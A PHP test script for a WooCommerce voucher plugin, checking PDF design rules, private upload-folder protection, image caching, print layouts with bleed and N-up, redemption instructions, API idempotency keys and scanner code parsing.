check( 'M12-40: the designer warns about QR modules under 0.33 mm, bar modules under 0.19 mm and contrast under 4.5:1', 3 === count( $m12_warn ) && str_contains( $m12_warn[0], 'Tiny QR' ) && str_contains( $m12_warn[0], '0.33' ) && str_contains( $m12_warn[1], 'Narrow bars' ) && str_contains( $m12_warn[1], '0.19' ) && str_contains( $m12_warn[2], 'Pale QR' ) && str_contains( $m12_warn[2], '4.5:1' ), wp_json_encode( $m12_warn ) );
check( 'M12-40: the starter designs pass the readability checks', array() === TemplatePostType::design_warnings( TemplatePostType::default_designs()['giftcard'] ) && array() === TemplatePostType::design_warnings( TemplatePostType::default_designs()['ticket'] ) );
check( 'M12-40: contrast ratio as WCAG defines it', 21.0 === PdfRenderer::contrast_ratio( '#000', '#ffffff' ) && 1.0 === PdfRenderer::contrast_ratio( '#fff', '#ffffff' ) && PdfRenderer::contrast_ratio( '#777777', '#ffffff' ) < 4.5 && PdfRenderer::contrast_ratio( '#767676', '#ffffff' ) >= 4.5 );
check( 'M12-40/41: the designer explains the browser scanner (QR only on iOS/Firefox) and the lifetime of the printed download link', str_contains( (string) file_get_contents( VCAP_PATH . 'assets/js/designer.js' ), 't.barcodeScanner' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'assets/js/designer.js' ), 't.qrDownloadHint' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/TemplatePostType.php' ), "'barcodeScanner'" ) );

// M12-43: private folder with a random name, Apache 2.4 protection, temp files cleaned up after an hour.
$m12_base = $GLOBALS['vcap_test_uploads'];
unset( $GLOBALS['vcap_test_options'][ VCAP\Install::PRIVATE_DIR_OPTION ] );
@mkdir( $m12_base . '/vcap', 0777, true );
file_put_contents( $m12_base . '/vcap/keep.txt', 'old' );
$m12_name = VCAP\Install::private_dir_name();
check( 'M12-43: the private folder gets a random name; the old folder "vcap" is renamed with its files', (bool) preg_match( '/^vcap-[a-z0-9]{20}$/', $m12_name ) && ! is_dir( $m12_base . '/vcap' ) && 'old' === @file_get_contents( $m12_base . '/' . $m12_name . '/keep.txt' ) && VCAP\Install::upload_dir() === $m12_base . '/' . $m12_name, $m12_name );
VCAP\Install::ensure_upload_dir();
check( 'M12-43: the .htaccess files use the Apache 2.4 syntax (with a 2.2 fallback)', str_contains( (string) file_get_contents( VCAP\Install::upload_dir() . '/tmp/.htaccess' ), 'Require all denied' ) && str_contains( (string) file_get_contents( VCAP\Install::upload_dir() . '/.htaccess' ), 'Deny from all' ) );
$m12_dir  = VCAP\Install::upload_dir();
$m12_old  = time() - 2 * HOUR_IN_SECONDS;
$m12_junk = array( '/tmp/abc-voucher.pdf', '/tmp/img-0123.img', '/tmp/img-0123.img.Xy12.part', '/fonts/ca_dompdf_img_AbCd', '/img/x.png.Ab.part' );
foreach ( $m12_junk as $m12_f ) {
	file_put_contents( $m12_dir . $m12_f, 'x' );
	touch( $m12_dir . $m12_f, $m12_old );
}
file_put_contents( $m12_dir . '/tmp/fresh.pdf', 'x' );
file_put_contents( $m12_dir . '/fonts/DejaVuSans.ufm', 'x' );
touch( $m12_dir . '/fonts/DejaVuSans.ufm', $m12_old );
$m12_purged = VCAP\Install::purge_temp_files();
check( 'M12-43: the maintenance removes temp PDFs, img-*, *.part and dompdf temp images older than an hour, nothing else', 5 === $m12_purged && ! array_filter( $m12_junk, static fn( $f ) => file_exists( $m12_dir . $f ) ) && file_exists( $m12_dir . '/tmp/fresh.pdf' ) && file_exists( $m12_dir . '/fonts/DejaVuSans.ufm' ), (string) $m12_purged );
@unlink( $m12_dir . '/tmp/fresh.pdf' );
@unlink( $m12_dir . '/fonts/DejaVuSans.ufm' );
check( 'M12-92: COMPATIBILITY.md explains what WooCommerce Analytics shows', str_contains( (string) file_get_contents( VCAP_PATH . 'COMPATIBILITY.md' ), '## WooCommerce Analytics' ) );
check( 'M12-43: COMPATIBILITY.md has the nginx snippet; Site Health requests a test file', str_contains( (string) file_get_contents( VCAP_PATH . 'COMPATIBILITY.md' ), 'location ~* ^/wp-content/uploads/vcap' ) && method_exists( VCAP\Health::class, 'probe_private_dir' ) );

// M12-72: subdivision flags and keycaps leave no tag characters or boxes.
$m12_emoji = PdfRenderer::strip_unprintable_emoji( "Für Schottland 🏴\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F} und 1\u{FE0F}\u{20E3} ok" );
check( 'M12-72: subdivision flags (tag characters) and keycap emoji are left out', ! preg_match( '/[\x{E0000}-\x{E007F}\x{FE0F}\x{1F3F4}]/u', $m12_emoji ) && str_contains( $m12_emoji, 'Für Schottland' ) && str_contains( $m12_emoji, 'ok' ), $m12_emoji );

// M12-73: large PNGs are reduced once and cached, opaque ones as JPEG; previews are cached for 10 minutes.
if ( function_exists( 'imagecreatetruecolor' ) ) {
	$m12_png = $m12_base . '/2026/11/big-opaque.png';
	$m12_im  = imagecreatetruecolor( 2400, 1700 );
	for ( $m12_i = 0; $m12_i < 3000; $m12_i++ ) {
		imagefilledellipse( $m12_im, random_int( 0, 2400 ), random_int( 0, 1700 ), 60, 60, (int) imagecolorallocate( $m12_im, random_int( 0, 255 ), random_int( 0, 255 ), random_int( 0, 255 ) ) );
	}
	imagepng( $m12_im, $m12_png );
	$m12_alpha = $m12_base . '/2026/11/big-alpha.png';
	$m12_ia    = imagecreatetruecolor( 3000, 2000 );
	imagealphablending( $m12_ia, false );
	imagesavealpha( $m12_ia, true );
	imagefill( $m12_ia, 0, 0, (int) imagecolorallocatealpha( $m12_ia, 255, 0, 0, 80 ) );
	imagepng( $m12_ia, $m12_alpha );
	$m12_o  = PdfRenderer::optimized_image( $m12_png, 105, 74 );
	$m12_a  = PdfRenderer::optimized_image( $m12_alpha, 105, 74 );
	$m12_ai = @getimagesize( $m12_a );
	check( 'M12-73: an opaque PNG is printed from a cached JPEG, a large transparent PNG from a reduced PNG', str_ends_with( $m12_o, '.jpg' ) && 'image/jpeg' === ( getimagesize( $m12_o )['mime'] ?? '' ) && str_starts_with( $m12_o, VCAP\Install::upload_dir() . '/img/' ) && str_ends_with( $m12_a, '.png' ) && is_array( $m12_ai ) && $m12_ai[0] < 3000 && PdfRenderer::png_has_alpha( $m12_a ), wp_json_encode( array( $m12_o, $m12_a, $m12_ai ) ) );
	$m12_mtime = filemtime( $m12_o );
	check( 'M12-73: the reduced copy is made once and reused; a small PNG is used as it is', $m12_o === PdfRenderer::optimized_image( $m12_png, 105, 74 ) && filemtime( $m12_o ) === $m12_mtime && $png === PdfRenderer::optimized_image( $png, 105, 74 ) );
	$m12_bg = vcap()->pdf->html( $v, array( 'page' => array( 'format' => 'A6', 'backgroundImage' => 'https://shop.test/wp-content/uploads/2026/11/big-alpha.png' ), 'elements' => array() ) );
	check( 'M12-73: the PDF embeds a reduced cached copy, not the original', (bool) preg_match( '#' . preg_quote( VCAP\Install::upload_dir() . '/img/', '#' ) . '[0-9a-f]{32}\.png#', $m12_bg ) && ! str_contains( $m12_bg, $m12_alpha ), $m12_bg );
}
$m12_pv_a          = clone $v;
$m12_pv_b          = clone $v;
$m12_pv_b->message = 'Anders';
check( 'M12-73: the preview cache key follows design, fields and amount', VCAP\Preview::cache_file( $m12_gift, $m12_pv_a ) === VCAP\Preview::cache_file( $m12_gift, clone $v ) && VCAP\Preview::cache_file( $m12_gift, $m12_pv_a ) !== VCAP\Preview::cache_file( $m12_gift, $m12_pv_b ) && 600 === VCAP\Preview::CACHE_SECONDS );

// M12-74: voucher links with badge images and the placeholder {link:<id>}.
$GLOBALS['vcap_test_filters']['vcap_voucher_links'] = array(
	array(
		static fn( $links ) => array(
			array( 'id' => 'Wallet', 'label' => 'Add to Wallet', 'url' => 'https://wallet.example/p/1', 'image' => 'https://wallet.example/badge.svg', 'width' => 9999, 'alt' => '<b>Apple</b> Wallet' ),
			array( 'id' => 'g', 'label' => 'Google', 'url' => 'https://pay.example/g', 'image' => 'http://insecure.example/b.png' ),
		),
		1,
	),
);
$m12_links = VCAP\Downloads::voucher_links( $v, 'email' );
check( 'M12-74: voucher links keep an id, an https badge image (width 16–400) and an alt text; http images are dropped', 'wallet' === ( $m12_links[0]['id'] ?? '' ) && 'https://wallet.example/badge.svg' === ( $m12_links[0]['image'] ?? '' ) && 400 === ( $m12_links[0]['width'] ?? 0 ) && 'Apple Wallet' === ( $m12_links[0]['alt'] ?? '' ) && ! isset( $m12_links[1]['image'] ), wp_json_encode( $m12_links ) );
$m12_links_html = VCAP\Downloads::voucher_links_html( $m12_links );
check( 'M12-74: badges are printed as escaped image links, other links as text', str_contains( $m12_links_html, '<img src="https://wallet.example/badge.svg" width="400" alt="Apple Wallet"' ) && str_contains( $m12_links_html, '>Google</a>' ), $m12_links_html );
check( 'M12-74: {link:wallet} prints the URL of that link', 'Pass: https://wallet.example/p/1' === Placeholders::replace( 'Pass: {link:wallet}', $v ) );
unset( $GLOBALS['vcap_test_filters']['vcap_voucher_links'] );
check( 'M12-74: both bundle templates print the voucher links per row', str_contains( (string) file_get_contents( VCAP_PATH . 'templates/emails/voucher-bundle.php' ), "voucher_links( \$vcap_v, 'email' )" ) && str_contains( (string) file_get_contents( VCAP_PATH . 'templates/emails/plain/voucher-bundle.php' ), "voucher_links( \$vcap_v, 'email_plain' )" ) );

// M12-75: bleed, crop marks, N-up on A4.
$m12_bleed_design = array(
	'page'     => array( 'format' => 'A6', 'bleed' => 3, 'cropMarks' => true, 'background' => '#123456' ),
	'elements' => array(
		array( 'id' => 'band', 'type' => 'rect', 'x' => 0, 'y' => 0, 'w' => 105, 'h' => 20, 'fill' => '#ff0000' ),
		array( 'id' => 'txt', 'type' => 'text', 'x' => 10, 'y' => 30, 'w' => 50, 'h' => 10, 'text' => 'Hallo' ),
	),
);
check( 'M12-75: the sheet is the page plus the bleed on every side', array( 111.0, 154.0 ) === PdfRenderer::sheet_size( $m12_bleed_design['page'] ) && array( 105, 148 ) === PdfRenderer::page_size( $m12_bleed_design['page'] ) );
$m12_band = PdfRenderer::bleed_element( $m12_bleed_design['elements'][0], 105, 148, 3 );
$m12_txt  = PdfRenderer::bleed_element( $m12_bleed_design['elements'][1], 105, 148, 3 );
check( 'M12-75: a shape at the edge reaches into the bleed, a text only moves', 0.0 === (float) $m12_band['x'] && 0.0 === (float) $m12_band['y'] && 111.0 === (float) $m12_band['w'] && 23.0 === (float) $m12_band['h'] && 13.0 === (float) $m12_txt['x'] && 33.0 === (float) $m12_txt['y'] && 50.0 === (float) $m12_txt['w'], wp_json_encode( array( $m12_band, $m12_txt ) ) );
file_put_contents( "$out/m12-bleed.pdf", vcap()->pdf->render( $v, $m12_bleed_design ) );
$m12_info = (string) shell_exec( 'pdfinfo ' . escapeshellarg( "$out/m12-bleed.pdf" ) . ' 2>/dev/null' );
if ( preg_match( '/Page size:\s+([\d.]+) x ([\d.]+) pts/', $m12_info, $m12_m ) ) {
	check( 'M12-75: the PDF of a design with 3 mm bleed is 111 × 154 mm', abs( (float) $m12_m[1] - 111 * PdfRenderer::MM_TO_PT ) < 1 && abs( (float) $m12_m[2] - 154 * PdfRenderer::MM_TO_PT ) < 1, $m12_m[0] );
}
check( 'M12-75: crop marks are drawn in the bleed', 8 === substr_count( vcap()->pdf->html( $v, $m12_bleed_design ), 'background:#000000;"></div>' ) && 0 === substr_count( vcap()->pdf->html( $v, array_replace_recursive( $m12_bleed_design, array( 'page' => array( 'cropMarks' => false ) ) ) ), 'background:#000000;"></div>' ) );
check( 'M12-75: N-up: four A6, two A5, one DL beside another, one A4 per A4 sheet', 4 === PdfRenderer::nup_layout( 105, 148 )['cols'] * PdfRenderer::nup_layout( 105, 148 )['rows'] && 2 === PdfRenderer::nup_layout( 148, 210 )['cols'] * PdfRenderer::nup_layout( 148, 210 )['rows'] && 3 === PdfRenderer::nup_layout( 99, 210 )['cols'] * PdfRenderer::nup_layout( 99, 210 )['rows'] && 1 === PdfRenderer::nup_layout( 210, 297 )['cols'] * PdfRenderer::nup_layout( 210, 297 )['rows'], wp_json_encode( PdfRenderer::nup_layout( 99, 210 ) ) );
$GLOBALS['vcap_test_filters']['vcap_template_design'] = array( array( static fn() => array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 5, 'y' => 5, 'w' => 90, 'h' => 10, 'text' => '{coupon_code}' ) ) ), 1 ) );
$m12_nup_list = array();
for ( $m12_i = 0; $m12_i < 5; $m12_i++ ) {
	$m12_nv       = clone $v;
	$m12_nv->id   = 900 + $m12_i;
	$m12_nv->code = 'NUP-CODE-' . $m12_i;
	$m12_nup_list[] = $m12_nv;
}
$m12_nup = vcap()->pdf->render_many( $m12_nup_list, true );
unset( $GLOBALS['vcap_test_filters']['vcap_template_design'] );
file_put_contents( "$out/m12-nup.pdf", $m12_nup[0]['pdf'] );
$m12_nup_info = (string) shell_exec( 'pdfinfo ' . escapeshellarg( "$out/m12-nup.pdf" ) . ' 2>/dev/null' );
if ( '' !== $m12_nup_info ) {
	$m12_nup_text = (string) shell_exec( 'pdftotext ' . escapeshellarg( "$out/m12-nup.pdf" ) . ' - 2>/dev/null' );
	check( 'M12-75: five A6 vouchers are printed on two A4 sheets (render_many N-up)', 1 === count( $m12_nup ) && (bool) preg_match( '/Pages:\s+2\b/', $m12_nup_info ) && (bool) preg_match( '/Page size:\s+595\.\d+ x 841\.\d+ pts/', $m12_nup_info ) && 5 === substr_count( $m12_nup_text, 'NUP-CODE-' ), $m12_nup_info );
}

// M12-76: PDF title "Product – Shop" (never the code) and the document language.
$m12_title_info = (string) shell_exec( 'pdfinfo ' . escapeshellarg( "$out/m12-bleed.pdf" ) . ' 2>/dev/null' );
if ( '' !== $m12_title_info ) {
	check( 'M12-76: the PDF title names the shop (and product), not the voucher code', str_contains( $m12_title_info, 'Café Süß & Co' ) && ! str_contains( $m12_title_info, $v->code ), $m12_title_info );
}
check( 'M12-76: the PDF HTML carries the language and a title without the code', (bool) preg_match( '/<html lang="[a-z]{2}(-[A-Z]{2})?">/', vcap()->pdf->html( $v, $m12_bleed_design ) ) && ! str_contains( PdfRenderer::pdf_title( $v ), $v->code ) && str_contains( (string) file_get_contents( VCAP_PATH . 'ACCESSIBILITY.md' ), 'nicht getaggt' ) );

// M12-77: {expiry_line}; a line with {expiry_date} is left out for vouchers without expiry.
$m12_noexp             = clone $v;
$m12_noexp->expires_at = null;
$m12_noexp_html        = vcap()->pdf->html( $m12_noexp, array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 5, 'y' => 5, 'w' => 90, 'h' => 20, 'text' => "Code {coupon_code}\nValid until {expiry_date}" ), array( 'type' => 'text', 'x' => 5, 'y' => 30, 'w' => 90, 'h' => 10, 'text' => '{expiry_line}' ) ) ) );
check( 'M12-77: without expiry "Valid indefinitely" is printed and "Valid until {expiry_date}" is left out', str_contains( $m12_noexp_html, 'Valid indefinitely' ) && ! str_contains( $m12_noexp_html, 'Valid until' ) && ! str_contains( $m12_noexp_html, 'unlimited' ) && str_contains( $m12_noexp_html, 'Code ' . $v->code ), $m12_noexp_html );
check( 'M12-77: with expiry {expiry_line} reads "Valid until <date>"; the starter gift card uses it', str_starts_with( Placeholders::replace( '{expiry_line}', $v ), 'Valid until ' ) && str_contains( Placeholders::replace( '{expiry_line}', $v ), '2027' ) && in_array( '{expiry_line}', array_column( TemplatePostType::default_designs()['giftcard']['elements'], 'text' ), true ) );
// Z13: a voucher keeps the design of its template at issue time (also after a redesign or deletion).
if ( ! function_exists( 'update_post_meta' ) ) {
	function update_post_meta( $id, $k, $v ) { $GLOBALS['vcap_test_meta'][ $id ][ $k ] = $v; return true; }
}
if ( ! function_exists( 'delete_post_meta' ) ) {
	function delete_post_meta( $id, $k ) { unset( $GLOBALS['vcap_test_meta'][ $id ][ $k ] ); return true; }
}
$p8_tpl = static fn( string $label ) => (string) wp_json_encode( array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 5, 'y' => 5, 'w' => 90, 'h' => 10, 'text' => $label . ' {coupon_code}' ) ) ) );
$p8_label = static fn( array $design ) => (string) ( $design['elements'][0]['text'] ?? '' );
$GLOBALS['vcap_test_meta'][500][ TemplatePostType::META ] = $p8_tpl( 'CHRISTMAS' );
TemplatePostType::record_design_change( 500, $p8_tpl( 'CHRISTMAS' ), $p8_tpl( 'JANUARY' ), true );
$GLOBALS['vcap_test_meta'][500][ TemplatePostType::META ] = $p8_tpl( 'JANUARY' );
$p8_hist = $GLOBALS['vcap_test_meta'][500][ TemplatePostType::HISTORY_META ] ?? array();
$p8_sold                = clone $v;
$p8_sold->id            = 41;
$p8_sold->template_id   = 500;
$p8_sold->created_at    = gmdate( 'Y-m-d H:i:s', time() - DAY_IN_SECONDS );
$p8_new                 = clone $p8_sold;
$p8_new->id             = 42;
$p8_new->created_at     = gmdate( 'Y-m-d H:i:s', time() + 5 );
$p8_preview             = clone $p8_sold;
$p8_preview->id         = 0;
check( 'Z13: a replaced design that vouchers were issued with is kept with the time it was replaced', 1 === count( $p8_hist ) && $p8_tpl( 'CHRISTMAS' ) === $p8_hist[0]['design'] && abs( $p8_hist[0]['until'] - time() ) < 5 );
check( 'Z13: a voucher sold before the redesign keeps its design, later vouchers and previews get the new one', 'CHRISTMAS {coupon_code}' === $p8_label( TemplatePostType::design_for_voucher( 500, $p8_sold ) ) && 'JANUARY {coupon_code}' === $p8_label( TemplatePostType::design_for_voucher( 500, $p8_new ) ) && 'JANUARY {coupon_code}' === $p8_label( TemplatePostType::design_for_voucher( 500, $p8_preview ) ) );
file_put_contents( "$out/p8-sold.pdf", vcap()->pdf->render( $p8_sold ) );
$p8_text = (string) shell_exec( 'pdftotext ' . escapeshellarg( "$out/p8-sold.pdf" ) . ' - 2>/dev/null' );
if ( '' !== trim( $p8_text ) ) {
	check( 'Z13: the PDF of the sold voucher shows the design it was issued with', str_contains( $p8_text, 'CHRISTMAS GIFT-ABCD-1234' ) && ! str_contains( $p8_text, 'JANUARY' ), $p8_text );
}
TemplatePostType::record_design_change( 500, $p8_tpl( 'JANUARY' ), $p8_tpl( 'DRAFT' ), false );
check( 'Z13: a design no voucher was issued with is not kept', 1 === count( $GLOBALS['vcap_test_meta'][500][ TemplatePostType::HISTORY_META ] ) );
TemplatePostType::record_design_change( 500, $p8_tpl( 'DRAFT' ), $p8_tpl( 'DRAFT' ), true, true );
check( 'Z13: "Also use this design for vouchers already issued" drops the kept designs', ! isset( $GLOBALS['vcap_test_meta'][500][ TemplatePostType::HISTORY_META ] ) && 'JANUARY {coupon_code}' === $p8_label( TemplatePostType::design_for_voucher( 500, $p8_sold ) ) );
$GLOBALS['vcap_test_options'][ TemplatePostType::ARCHIVE_OPTION . 501 ] = array( 'deleted' => time() - 60, 'design' => $p8_tpl( 'DELETED' ), 'history' => array() );
$p8_sold->template_id = 501;
$p8_new->template_id  = 501;
check( 'Z13: vouchers issued with a template deleted later keep its design, newer ones get the fallback', 'DELETED {coupon_code}' === $p8_label( TemplatePostType::design_for_voucher( 501, $p8_sold ) ) && TemplatePostType::default_designs()['giftcard']['page'] === TemplatePostType::design_for_voucher( 501, $p8_new )['page'] );
unset( $GLOBALS['vcap_test_meta'][500], $GLOBALS['vcap_test_options'][ TemplatePostType::ARCHIVE_OPTION . 501 ] );
// H6: how to redeem follows the voucher's redemption channels in the mail, the PDF and My Account.
if ( ! function_exists( 'wc_get_order_item_meta' ) ) {
	function wc_get_order_item_meta( $id, $key, $single = true ) { return $GLOBALS['vcap_test_item_meta'][ $id ][ $key ] ?? ''; }
}
$p8_ch = static function ( array $channels, string $type = 'giftcard' ) use ( $v ): VCAP\Voucher {
	$c                = clone $v;
	$c->type          = $type;
	$c->order_item_id = 7001 + count( $GLOBALS['vcap_test_item_meta'] ?? array() );
	$GLOBALS['vcap_test_item_meta'][ $c->order_item_id ][ VCAP\Issuer::LINE_META ] = array( 'channels' => $channels );
	return $c;
};
$p8_spa = $p8_ch( array( VCAP\Channels::COUNTER ) );
check( 'H6: without a channel selection the code is entered in the cart', 'Enter the code in the cart or at checkout on Café Süß & Co to redeem it.' === VCAP\Channels::instructions( $p8_ch( array() ) ) );
check( 'H6: a voucher only for the counter (spa) is not sent to the cart', str_contains( VCAP\Channels::instructions( $p8_spa ), 'at the counter of Café Süß & Co' ) && ! str_contains( VCAP\Channels::instructions( $p8_spa ), 'cart or at checkout' ) );
check( 'H6: shop + counter names both, external only points to the redeem page, tickets get none', str_contains( VCAP\Channels::instructions( $p8_ch( array( 'shop', 'counter' ) ) ), 'or show this voucher at the counter' ) && str_contains( VCAP\Channels::instructions( $p8_ch( array( 'external' ) ) ), 'redeem page' ) && '' === VCAP\Channels::instructions( $p8_ch( array(), 'ticket' ) ) );
check( 'H6: the shop name is linked and escaped in the HTML mail text', str_contains( VCAP\Channels::instructions_html( $p8_ch( array() ) ), '<a href="https://shop.test/">Café Süß &amp; Co</a>' ) );
$p8_gift = TemplatePostType::default_designs()['giftcard'];
$p8_html = vcap()->pdf->html( $p8_spa, $p8_gift );
check( 'H6: the default gift card PDF shows the shop URL, how to redeem (per channel), transferability and conditions', str_contains( $p8_html, 'https://shop.test/' ) && str_contains( $p8_html, 'at the counter of Café Süß &amp; Co' ) && str_contains( $p8_html, 'Transferable' ) && str_contains( implode( ' ', array_column( $p8_gift['elements'], 'text' ) ), '{redemption_terms}' ) );
$p8_mail = (string) file_get_contents( VCAP_PATH . 'templates/emails/voucher.php' );
check( 'H6: the mails and My Account use the channel instructions, not the fixed cart sentence', ! str_contains( $p8_mail, "Enter the code in the cart or at checkout on %s to redeem it." ) && str_contains( $p8_mail, 'Channels::instructions_html( $voucher )' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'templates/emails/plain/voucher.php' ), 'Channels::instructions( $voucher )' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'templates/myaccount/vouchers-table.php' ), 'Channels::instructions( $voucher )' ) );
check( 'H6: {redeem_instructions} is offered as a placeholder', isset( Placeholders::definitions()['redeem_instructions'] ) );
unset( $GLOBALS['vcap_test_item_meta'] );
$p8_js = (string) file_get_contents( VCAP_PATH . 'assets/js/designer.js' );
check( 'H16: the designer shrinks overflowing texts like the PDF and marks texts that are still cut off', str_contains( $p8_js, 'function fitText( inner )' ) && str_contains( $p8_js, "classList.toggle( 'is-overflowing'" ) );
check( 'Z14: the designer gives custom PDF fonts their own font stack', str_contains( $p8_js, "FONT_STACKS[ family ] = '\"' +" ) );

echo "Redemption API\n";
$valid_keys   = array( 'it-' . str_repeat( 'a', 20 ), 'learnboating:grant:1234', '550e8400-e29b-41d4-a716-446655440000' );
$invalid_keys = array( 'short', '-leading-dash', str_repeat( 'x', 65 ), 'has space 12345', "nl\n12345678" );
check( 'valid idempotency keys are accepted', count( $valid_keys ) === count( array_filter( $valid_keys, static fn( $k ) => preg_match( \VCAP\API\V1\RedemptionService::KEY_PATTERN, $k ) ) ) );
check( 'malformed idempotency keys are rejected', 0 === count( array_filter( $invalid_keys, static fn( $k ) => preg_match( \VCAP\API\V1\RedemptionService::KEY_PATTERN, $k ) ) ) );
$h = \VCAP\API\V1\RedemptionService::request_hash( 7, 'course:1', 30, 5 );
check( 'request fingerprint is stable and amount-normalised', $h === \VCAP\API\V1\RedemptionService::request_hash( 7, 'course:1', 30.0000, 5 ) );
check( 'request fingerprint changes with target, amount or user', count( array_unique( array( $h, \VCAP\API\V1\RedemptionService::request_hash( 7, 'course:2', 30, 5 ), \VCAP\API\V1\RedemptionService::request_hash( 7, 'course:1', 30.01, 5 ), \VCAP\API\V1\RedemptionService::request_hash( 7, 'course:1', 30, 6 ) ) ) ) === 4 );

$p13_deep = array( 'a' => array( 'b' => array( 'c' => array( 'd' => 1 ) ) ) );
check( 'P13: caller metadata is limited to 8 KB and 3 levels', \VCAP\API\V1\RedemptionService::meta_acceptable( array( 'a' => array( 'b' => array( 'c' => 1 ) ) ) ) && ! \VCAP\API\V1\RedemptionService::meta_acceptable( $p13_deep ) && ! \VCAP\API\V1\RedemptionService::meta_acceptable( array( 'x' => str_repeat( 'y', 8200 ) ) ) && \VCAP\API\V1\RedemptionService::meta_acceptable( null ) );
check( 'P13: a REST key with a prefix must use the prefix of its target; UUID keys are free', \VCAP\API\V1\RestController::key_matches_target( 'learnboating:u5:abc', 'learnboating:product:1' ) && ! \VCAP\API\V1\RestController::key_matches_target( 'learnboating:grant:1234', 'test:course:1' ) && \VCAP\API\V1\RestController::key_matches_target( '550e8400-e29b-41d4-a716-446655440000', 'test:course:1' ) && ! \VCAP\API\V1\RestController::key_matches_target( 'pos:1234567', 'posx:till' ) );
check( 'P13: the Learnboating grant keys are internal (never created over REST)', \VCAP\API\V1\RestController::is_internal_key( 'learnboating:grant:1234' ) && ! \VCAP\API\V1\RestController::is_internal_key( 'learnboating:u5:abc' ) );

echo "Counter redemption (scanner): plausibility and refusal reasons\n";
check( 'an amount within the balance may be booked', '' === Tickets::counter_amount_error( 12.5, 50, 2, false ) && '' === Tickets::counter_amount_error( 50, 50, 2, false ) );
check( 'an amount above the balance is refused unless a partial booking is asked for', 'exceeds_balance' === Tickets::counter_amount_error( 80, 50, 2, false ) && '' === Tickets::counter_amount_error( 80, 50, 2, true ) );
check( 'one cent above the balance is already refused (minor units, no float noise)', 'exceeds_balance' === Tickets::counter_amount_error( 50.01, 50, 2, false ) && '' === Tickets::counter_amount_error( 0.1 + 0.2, 0.3, 2, false ) );
check( 'zero, negative and non-finite amounts are refused', 'amount_missing' === Tickets::counter_amount_error( 0, 50, 2, false ) && 'amount_missing' === Tickets::counter_amount_error( -5, 50, 2, true ) && 'amount_missing' === Tickets::counter_amount_error( NAN, 50, 2, false ) && 'amount_missing' === Tickets::counter_amount_error( INF, 50, 2, true ) );
check( 'more decimals than the currency has are refused (EUR 0.999, JPY 12.5), KWD 1.5 is fine', 'amount_precision' === Tickets::counter_amount_error( 0.999, 50, 2, false ) && 'amount_precision' === Tickets::counter_amount_error( 12.5, 5000, 0, false ) && '' === Tickets::counter_amount_error( 1.5, 5, 3, false ) && '' === Tickets::counter_amount_error( 0.29, 5, 2, false ) );
check( 'minor units are exact', 29 === CouponManager::minor_units( 0.29, 2 ) && 1500 === CouponManager::minor_units( 1500, 0 ) && 1500 === CouponManager::minor_units( 1.5, 3 ) );
$counter_card              = new Voucher();
$counter_card->usage_mode  = 'balance';
$counter_card->balance     = 50;
$counter_card->status      = Voucher::STATUS_ACTIVE;
$counter_reason            = static function ( array $props ) use ( $counter_card ): string {
	$v = clone $counter_card;
	foreach ( $props as $k => $val ) {
		$v->$k = $val;
	}
	return CouponManager::balance_refusal( $v );
};
check( 'an active card with balance can be charged', '' === CouponManager::balance_refusal( $counter_card ) );
check(
	'each refusal names its own reason (cancelled, expired, reserved, not delivered, used up, other status)',
	'void' === $counter_reason( array( 'status' => Voucher::STATUS_VOID ) )
	&& 'expired' === $counter_reason( array( 'status' => Voucher::STATUS_EXPIRED ) )
	&& 'expired' === $counter_reason( array( 'expires_at' => gmdate( 'Y-m-d H:i:s', time() - 3600 ) ) )
	&& 'reserved' === $counter_reason( array( 'status' => Voucher::STATUS_RESERVED ) )
	&& 'scheduled' === $counter_reason( array( 'status' => Voucher::STATUS_SCHEDULED ) )
	&& 'redeemed' === $counter_reason( array( 'status' => Voucher::STATUS_REDEEMED ) )
	&& 'redeemed' === $counter_reason( array( 'balance' => 0.0 ) )
	&& 'not_active' === $counter_reason( array( 'status' => 'pending' ) )
	&& 'not_multi_use' === $counter_reason( array( 'usage_mode' => 'single' ) )
	&& 'not_found' === CouponManager::balance_refusal( null )
);
$counter_messages = array();
foreach ( array( 'exceeds_balance', 'void', 'expired', 'reserved', 'scheduled', 'redeemed', 'not_active', 'no_transactions', 'db_error', 'amount_precision', 'amount_missing' ) as $counter_code ) {
	$counter_messages[ $counter_code ] = Tickets::refusal_message( $counter_code, '80,00 €', '50,00 €', 2 );
}
check( 'refusal messages differ per reason (no blanket "amount exceeds the balance")', count( $counter_messages ) === count( array_unique( $counter_messages ) ), json_encode( $counter_messages, JSON_UNESCAPED_UNICODE ) );
check( 'the over-balance refusal names the entered amount and the remaining balance', str_contains( $counter_messages['exceeds_balance'], '80,00 €' ) && str_contains( $counter_messages['exceeds_balance'], '50,00 €' ) );
check( 'only the over-balance refusal mentions the balance being exceeded', 1 === count( array_filter( $counter_messages, static fn( $m ) => str_contains( $m, 'exceeds' ) ) ) );

echo "Scanner: code recognition, context, undo and cancellation rules\n";
$cand = Tickets::code_candidates( 'https://shop.test/gutschein/?gutschein=ABCD-EFGH-2345&utm=x' );
check( 'a custom QR link is read: its parameter values are looked up as codes', 'abcd-efgh-2345' === ( $cand[0] ?? '' ) && in_array( 'x', $cand, true ), json_encode( $cand ) );
check( 'the last path segment of a link counts too', in_array( 'k7qm2x9zpa', Tickets::code_candidates( 'https://shop.test/redeem/K7QM2X9ZPA' ), true ) );
$cand = Tickets::code_candidates( ' ABCD EFGH ' );
check( 'spaces are removed or read as dashes, separators dropped', array( 'abcd efgh', 'abcdefgh', 'abcd-efgh' ) === array_slice( $cand, 0, 3 ), json_encode( $cand ) );
$cand = Tickets::code_candidates( 'GIFTßYZ12' );
check( 'USB scanner on a German keyboard: Y/Z swapped and ß read as dash, after the exact forms', 'giftßyz12' === $cand[0] && in_array( 'gift-zy12', $cand, true ) && array_search( 'gift-zy12', $cand, true ) > array_search( 'giftßyz12', $cand, true ), json_encode( $cand ) );
check( 'at most 12 candidates, never empty ones', count( Tickets::code_candidates( 'https://shop.test/?a=1&b=2&c=3&d=4&e=5&f=6' ) ) <= 12 && array() === Tickets::code_candidates( '   ' ) );

